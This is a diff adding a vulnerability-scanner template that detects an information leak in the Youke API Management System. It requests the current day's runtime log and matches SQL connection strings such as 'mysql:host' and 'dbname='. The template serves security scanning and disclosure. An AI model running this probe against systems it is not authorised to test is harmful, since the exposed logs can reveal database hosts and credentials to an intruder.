@@ -1,0 +1,33 @@
+id: poc-youke-api-log-info-leak
+info:
+  name: Youke API Management System Log Info Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    This template identifies log information leakage in Youke API Management System, exposing sensitive SQL-related details.
+
+variables:
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+  dt3: "{{date_time('02')}}"
+
+http:
+  - method: GET
+    path:
+      - "/runtime/log/{{dt1}}{{dt2}}/{{dt3}}.log"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[ sql ]"
+          - "mysql:host"
+          - "dbname="
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
